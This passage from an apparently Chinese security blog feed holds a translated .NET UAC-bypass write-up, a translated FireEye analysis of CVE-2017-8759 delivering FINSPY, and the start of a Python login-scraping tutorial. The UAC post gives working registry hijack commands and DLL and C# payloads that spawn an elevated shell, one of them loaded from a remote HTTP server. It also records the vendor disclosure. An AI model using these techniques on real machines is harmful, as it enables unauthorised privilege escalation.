REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f</div><div class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f</div><div class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f</div><div class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f</div><div class="line">mmc gpedit.msc</div></pre></td></tr></table></figure> <p>这些命令在低权限命令行下可以在高权限的mmc.exe进程中加载C:\temp\test.dll(如果存在)。可以绕过Windows 7到10（包括最新RS3）系统的默认UAC设置。</p> <p><img src="/img/net-bypass-uac-1.png" alt="net-bypass-uac-1.png"></p> <p><a href="https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9" target="_blank" rel="external">内嵌DLL的powershell POC可以在这里找到（只支持X64）。</a></p> <p>这个DLL只在DLL_PROCESS_ATTACH下运行一个cmd.exe，会产生一个提权的命令行终端，然后马上退出当前进程，阻止MMC控制台弹出。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</div><div class="line">&#123;</div><div class="line">    char cmd[] = &quot;cmd.exe&quot;;</div><div class="line"></div><div class="line">    switch (fdwReason)</div><div class="line">    &#123;</div><div class="line">    case DLL_PROCESS_ATTACH:</div><div class="line">        WinExec(cmd, SW_SHOWNORMAL);</div><div class="line">        ExitProcess(0);</div><div class="line">        break;</div><div class="line">    case DLL_THREAD_ATTACH:</div><div class="line">        break;</div><div class="line">    case DLL_THREAD_DETACH:</div><div class="line">        break;</div><div class="line">    case DLL_PROCESS_DETACH:</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">    return TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>在Windows 7,8.1，10 1703和10 RS3 build 16275中测试通过。<br>当然，如果你有可访问的SMB共享，UNC路径也可以工作。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">COR_PROFILER_PATH=\\server\share\test.dll</div></pre></td></tr></table></figure> <h1 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h1><p>COM运行时在运行高权限进程时会阻止在HKCU查找CLSID，所以这种绕过方式无效，但是.NET运行时没有阻止，在这种情况下，.NET在shim组件查找时会查找这些键值。</p> <p><img src="/img/net-bypass-uac-2.png" alt="net-bypass-uac-2.png"></p> <p>如果要修复，需要CLR实现和COM一样的检查。</p> <h1 id="更多维度"><a href="#更多维度" class="headerlink" title="更多维度"></a>更多维度</h1><p>现在我们知道CLR是如何工作的了，我们可以在堆栈中找他CLR调用的其他在HKCU查找CLSID的实例。一个实例是GPEdit（Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager）组件（在我测试虚拟机中CLSID是{B29D466A-857D-35BA-8712-A758861BFEA1}）。</p> <p><img src="/img/net-bypass-uac-3.png" alt="net-bypass-uac-3.png"></p> <p>查看HKCU已经存在的项中，好像是指向CLR程序及自己实现的组件。</p> <p><img src="/img/net-bypass-uac-4.png" alt="net-bypass-uac-4.png"></p> <p>我们可以在HKCU下像这样定义一个COM项（.reg格式）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;]</div><div class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45E7-B440-6E39B2CDBF29&#125;]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32\10.0.0.0]</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\ProgId]</div><div class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</div></pre></td></tr></table></figure></p> <p>MMC会加载我们的托管DLL，并且尝试访问TestDotNet.Class1类。C#没有一种简单的创建入口是DllMain的简单DLL（我们很懒所以不想写模块初始化），但是貌似注册表指向的类被加载了，所以我们只需要一个静态构造函数来执行我们的提权代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Diagnostics;</div><div class="line"></div><div class="line">namespace TestDotNet</div><div class="line">&#123;</div><div class="line">   public class Class1</div><div class="line">   &#123;</div><div class="line">      static Class1()</div><div class="line">      &#123; </div><div class="line">         Process.Start(&quot;cmd.exe&quot;);</div><div class="line">         Environment.Exit(0);</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>将DLL放在注册表项定义的位置，然后运行gpedit.msc，可以看到弹出了一个提权的终端（和.NET一样）。</p> <p><img src="/img/net-bypass-uac-5.png" alt="net-bypass-uac-5.png"></p> <p><img src="/img/net-bypass-uac-6.png" alt="net-bypass-uac-6.png"></p> <p>这种方式一个有趣的点是CodeBase不仅限于本地文件和SMB共享，这个DLL还可以从HTTP链接中加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;CodeBase&quot;=&quot;http://server:8080/test_managed.dll&quot;</div></pre></td></tr></table></figure></p> <p>需要注意的是下载的DLL会拷贝到硬盘上，所以这种方式比本地DLL更好检测（硬盘+网络组合）。</p> <p>另外一件好事（对攻击者）是这种方式下可以滥用多种CLSID。<br>下面是在compmgmt.msc，event、vwr.msc,secpol.msc和taskschd.msc可使用CLSID：</p> <ol> <li>托管DLL的Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactor组件</li> </ol> <p><img src="/img/net-bypass-uac-7.png" alt="net-bypass-uac-7.png"><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;]</div><div class="line">@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45e7-B440-6E39B2CDBF29&#125;]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32\3.0.0.0]</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div></pre></td></tr></table></figure></p> <ol> <li>Native DLL的NDP SymBinder组件，劫持\Server项</li> </ol> <p><img src="/img/net-bypass-uac-8.png" alt="net-bypass-uac-8.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;]</div><div class="line">@=&quot;NDP SymBinder&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32\4.0.30319]</div><div class="line">@=&quot;4.0.30319&quot;</div><div class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ProgID]</div><div class="line">@=&quot;CorSymBinder_SxS&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\Server]</div><div class="line">@=&quot;C:\\Temp\\test_unmanaged.dll&quot;</div></pre></td></tr></table></figure> <ol> <li>Native DLL的Microsoft Common Language Runtime Meta Data组件，劫持\Server项（只有secpol.msc可用）</li> </ol> <p><img src="/img/net-bypass-uac-9.png" alt="net-bypass-uac-9.png"></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;]</div><div class="line">@=&quot;Microsoft Common Language Runtime Meta Data&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32\4.0.30319]</div><div class="line">@=&quot;4.0.30319&quot;</div><div class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\ProgID]</div><div class="line">@=&quot;CLRMetaData.CorRuntimeHost.2&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\Server]</div><div class="line">@=&quot;..\\..\\..\\..\\Temp\\test_unmanaged.dll&quot;</div></pre></td></tr></table></figure> <p>（注意：路径必须是相对的，否则mmc.exe会尝试加载C:\Windows\Microsoft.NET\Framework64\v4.0.30319\C:\Temp\test_unmanaged.dll）</p> <h1 id="不是安全边界"><a href="#不是安全边界" class="headerlink" title="不是安全边界"></a>不是安全边界</h1><p>微软多次申明UAC不是一个安全边界，安全从业者以更务实的角度来看它：不要信任UAC，不要用admin运行，用非admin用户运行不需要admin的任务，我非常赞同这种说法。</p> <p>但是依然很多人用admin运行所有的东西，他们都是渗透测试人员和红色组织（都是坏人）感兴趣的目标。所以我猜测还会有新的关于UAC的有趣技术。</p> <p>如果为了渗透测试，我推荐使用<a href="https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="external">@tiraniddo的例子</a>（<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1" target="_blank" rel="external">一个已经实现</a>，<a href="https://twitter.com/enigma0x3/status/907397236627329024" target="_blank" rel="external">另一个也快来了</a>），它不需要加载DLL，并且目前大部分EDR解决方案还不能捕获它。</p> <p>另外，如果你也在研究绕过UAC，这个主题外有很多资源，但是下面的必须读一下：</p> <ul> <li>@enigma0x3’s research (and his upcoming DerbyCon talk)</li> <li>@tiraniddo’s bypass techniques on UAC via the SilentCleanup task and process token reading: part 1, part 2 &amp; part 3</li> <li>@hFireF0X’s UACME project that implements most known UAC bypasses, and his posts on kernelmode</li> <li>@FuzzySec’s UAC workshop, and his Bypass-UAC project that implements several bypasses in PowerShell</li> </ul> <p>非常感谢Casey Smith(<a href="https://twitter.com/subTee" target="_blank" rel="external">@subtee</a>)指出.NET profiler DLL技巧，并且感谢对微软开发者找到根本原因给予的帮助，谢谢Matt Graeber (<a href="https://twitter.com/mattifestation/" target="_blank" rel="external">@mattifestation</a>) 的意见和review。</p> <h1 id="进展时间"><a href="#进展时间" class="headerlink" title="进展时间"></a>进展时间</h1><p>2017-05-19 发现bypass<br>2017-05-20 给MSRC发邮件 (cc’ing an MS dev as suggested by @mattifestation)<br>2017-05-22 MSRC创建主题 #38811<br>2017-05-20/23 和 MS dev讨论<br>2017-06-24  MSRC回复: “We have finished our investigation and determined this does not meet the bar for servicing downlevel. UAC is not a security boundary.”<br>2017-07-05 Stefan Kanthak绕过方案的完整披露<br>2017-09-15 发表本篇文章</p> <p>文章来源：<a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" target="_blank" rel="external">https://offsec.provadys.com/UAC-bypass-dotnet.html</a></p> ]]></content>          <summary type="html">            &lt;p&gt;.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="bypassUAC" scheme="https://anhkgg.github.io/tags/bypassUAC/"/>            <category term="UAC" scheme="https://anhkgg.github.io/tags/UAC/"/>            <category term=".NET" scheme="https://anhkgg.github.io/tags/NET/"/>            <category term="mmc.exe" scheme="https://anhkgg.github.io/tags/mmc-exe/"/>        </entry>      <entry>     <title>翻译：FireEye揭露CVE-2017-8759：分发FINSPY的0day</title>     <link href="https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/"/>     <id>https://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</id>     <published>2017-09-14T02:12:47.000Z</published>     <updated>2017-09-14T02:26:09.266Z</updated>          <content type="html"><![CDATA[<p>2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research</p> <p>FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。</p> <p>CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。</p> <p>FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。</p> <a id="more"></a> <p>FireEye将这个漏洞的细节分享给了微软，然后协调了信息披露的时间，发布了修补该漏洞的补丁和安全指导，可以在这里找到它们。</p> <p>FireEye的邮件，终端以及网络产品都已经可以检测该恶意文档。</p> <h1 id="针对俄语目标的漏洞"><a href="#针对俄语目标的漏洞" class="headerlink" title="针对俄语目标的漏洞"></a>针对俄语目标的漏洞</h1><p>该恶意文档（Проект.doc）（MD5：fe5c4d6bb78e170abf5cf3741868ea4c）可能是针对俄语目标的。</p> <p>在CVE-2017-8759利用成功之后，该文档会下载多个组件（后面有详情），最终会加载一个FINSPY payload（MD5：a7b990d5f57b244dd17e9a937a41e7f5）。</p> <p>FINSPY恶意软件，也叫做FinFisher或者WingBird，是可以购买的用于“合法窃听”的软件。基于这个和之前FINSPY的使用，我们有更多的信心说这个恶意文档是一个针对俄语目标的网络间谍活动。</p> <p>根据FireEye动态威胁情报系统的更多的检测，根据不同client的行为关联，发现该样本在2017年7月就已经出现了。</p> <h1 id="CVE-2017-8759-WSDL-解析器代码注入"><a href="#CVE-2017-8759-WSDL-解析器代码注入" class="headerlink" title="CVE-2017-8759 WSDL 解析器代码注入"></a>CVE-2017-8759 WSDL 解析器代码注入</h1><p>代码注入漏洞是存在于WSDL解析模块的PrintClientProxy方法中（<a href="http://referencesource.microsoft.com/" target="_blank" rel="external">http://referencesource.microsoft.com/</a> - System.Runtime.Remoting/metadata/wsdlparser.cs,6111）。</p> <p>IsValidUrl没有对提供的包含CRLF序列（换行回车）的数据进行正确的校验，这就允许了攻击者注入和执行任意代码。部分漏洞代码如图1所示。</p> <p><img src="/img/fireeye-CVE-2017-8759-1.png" alt="图1. WSDL解析器的漏洞"></p> <p>当在SOAP响应中多个address被定义时，代码会在第一个地址后插入“//base.ConfigureProxy(this.GetType(),”字符串，注释了后面剩余的address。然而，如果恶意的address的还有一个CRLF，后面的代码就不会被注释。</p> <p>图2展示了对CRLF缺乏验证，System.Diagnostics.Process.Start方法会被注入。生成的代码会被.NET框架的csc.exe编译，然后作为DLL加载到Office可执行程序中。</p> <p><img src="/img/fireeye-CVE-2017-8759-2.png" alt="图2. SOAP定义和产生的代码"> </p> <h1 id="在外散播的攻击"><a href="#在外散播的攻击" class="headerlink" title="在外散播的攻击"></a>在外散播的攻击</h1><p>FireEye检测到在外散播的攻击使用的是富文本(RTF)格式的文档，和我们之前报告的CVE-2017-0199文档类似。</p> <p>该恶意样本包含一个是利用更方便的嵌入的SOAP Moniker，如图3所示。</p> <p><img src="/img/fireeye-CVE-2017-8759-3.png" alt="图3. SOAP Moniker"> </p> <p>样本从一个攻击者控制的服务器接收恶意的SOAP WSDL定义的数据。.NET框架中System.Runtime.Remoting.ni.dll中实现的WSDL解析器会解析内容然后生成一个.cs源代码到工作目录中。</p> <p>接着.NET框架的csc.exe编译该代码生成一个名字像http[url path].dll的库文件。然后微软的Office会加载这个库，完成漏洞利用。图4展示了漏洞利用加载的示例库文件。</p> <p><img src="/img/fireeye-CVE-2017-8759-4.png" alt="图4. 被加载的DLL">  </p> <p>在成功的利用中，注入的代码会创建一个新的进程，利用mshta.exe会从同一个服务器接收一个叫做“word.db”的HTA脚本。</p> <p>HTA脚本会从磁盘删除源代码，编译的DLL和PDB文件，然后下载执行叫做“left.jpg”的FINSPY恶意软件，虽然它是.jpg后缀名，类型是image/jpeg，但其实是个可执行文件。</p> <p>图5展示了恶意软件传输的PCAP细节。</p> <p><img src="/img/fireeye-CVE-2017-8759-5.png" alt="图5. 实时的请求"> </p> <p>该恶意软件会被放在%appdata%\Microsoft\Windows\OfficeUpdte-KB[ 6 random numbers ].exe中。图6展示了在Process Monitor中的进程创建链。</p> <p><img src="/img/fireeye-CVE-2017-8759-6.png" alt="图6. 进程创建链"> </p> <h1 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h1><p>Left.jpg (md5: a7b990d5f57b244dd17e9a937a41e7f5)是FINSPY的变体。它利用高强度的混淆代码开发了一个内置虚拟机以及其他的一些反分析技术，来增加逆向的难度。比如另个月单独的反分析技术是，它会解析自己的全路径，然后搜索是否存在他自己的MD5哈希字符串。很多分析工具和沙箱为了能保证准确的唯一文件名会重命名样本文件为MD5哈希。该样本会使用WininetStartupMutex0的mutex来保证单实例。</p> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CVE-2017-8759是2017年FireEye发现的第二个分发FINSPY的0day。这个揭露说明签名资源对“合法窃听”的公司和他们用户都是可用的。此外，FINSPY买了多个不同的客户端，漏洞可以用于攻击其他的目标。</p> <p>CVE-2017-8759可能已经被更多的攻击者利用了。尽管我们没有证据，但是在2017年7月分析中，CVE-2017-0199已经被金融攻击者用来分发FINSPY。如果FINSPY的攻击者有之前使用的相同源码的漏洞，那么可能代码已经被卖给了更多的攻击者。</p> <h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>感谢Dhanesh Kizhakkinan, Joseph Reyes, FireEye Labs Team, FireEye FLARE Team and FireEye iSIGHT Intelligence发布这个博客。同样感谢MSRC协助解决这个问题的工作人员。</p> <p>参考：<a href="http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html</a></p> <p>文章来源：<br><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html</a></p> <p>转载请注明：<a href="http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/">http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</a></p> ]]></content>          <summary type="html">            &lt;p&gt;2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research&lt;/p&gt; &lt;p&gt;FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。&lt;/p&gt; &lt;p&gt;CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。&lt;/p&gt; &lt;p&gt;FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="FireEye" scheme="https://anhkgg.github.io/tags/FireEye/"/>            <category term="cve20178759" scheme="https://anhkgg.github.io/tags/cve20178759/"/>            <category term="FINSPY" scheme="https://anhkgg.github.io/tags/FINSPY/"/>        </entry>      <entry>     <title>pylogin系列之搞定百度统计</title>     <link href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/"/>     <id>https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</id>     <published>2017-08-21T16:01:25.000Z</published>     <updated>2017-08-22T05:31:17.909Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这次分析的百度统计登录接口，算是这几个中最简单的了。</p> <p>但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。</p> <a id="more"></a> <p>工具：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. chrome/firefox</div><div class="line">2. f12，network</div><div class="line">3. python：requests、re</div></pre></td></tr></table></figure> <h1 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h1><p>打开百度统计首页<code>https://tongji.baidu.com/web/welcome/login</code>，点开登录框，f12。尝试输入之后，查看发送的数据。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Request URL:https://cas.baidu.com/?action=login</div><div class="line">Request Method:POST</div><div class="line">Status Code:200 OK</div><div class="line"></div><div class="line">appscope[]:6</div><div class="line">appscope[]:7</div><div class="line">appscope[]:12</div><div class="line">appid:12</div><div class="line">entered_login:anhkgg //名字</div><div class="line">entered_password:1111111111111111 //密码</div><div class="line">entered_imagecode:9mxm //验证码</div><div class="line">charset:utf-8</div><div class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</div><div class="line">selfu:https://tongji.baidu.com/web/welcome/login</div><div class="line">senderr:1</div></pre></td></tr></table></figure> <p>除了上面注释的需要输入的三个字段，其他字段意义都不明确，偷点懒，多次尝试后发现其他字段不会变化，那么就用固定值了。</p> <p>点击验证码，看到网络，拿到获取验证码的请求，key使用10位时间戳。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET https://cas.baidu.com/?action=image&amp;key=1503151305</div></pre></td></tr></table></figure> <p>所以登录接口就出来了，<code>vcode</code>需要人工输入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">url = &apos;https://cas.baidu.com/?action=image&amp;key=&apos; + time_stamp(10)</div><div class="line">r = self.s.get(url)</div><div class="line"></div><div class="line">payload = &#123;</div><div class="line">    &apos;appscope[]&apos;:6,</div><div class="line">    &apos;appscope[]&apos;:7,</div><div class="line">    &apos;appscope[]&apos;:12,</div><div class="line">    &apos;appid&apos;:12,</div><div class="line">    &apos;entered_login&apos;:name,</div><div class="line">    &apos;entered_password&apos;:pwd,</div><div class="line">    &apos;entered_imagecode&apos;:vcode,</div><div class="line">    &apos;charset&apos;:&apos;utf-8&apos;,</div><div class="line">    &apos;fromu&apos;:&apos;https://tongji.baidu.com/web/welcome/loginback&apos;,</div><div class="line">    &apos;selfu&apos;:&apos;https://tongji.baidu.com/web/welcome/login&apos;,</div><div class="line">    &apos;senderr&apos;:1,</div><div class="line">    &#125;        </div><div class="line">url = &apos;https://cas.baidu.com/?action=login&apos;</div><div class="line">r = self.s.post(url, data = payload)</div></pre></td></tr></table></figure> <p>接着看看登录返回状态，如果失败了，返回数据中包含如下数据：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div 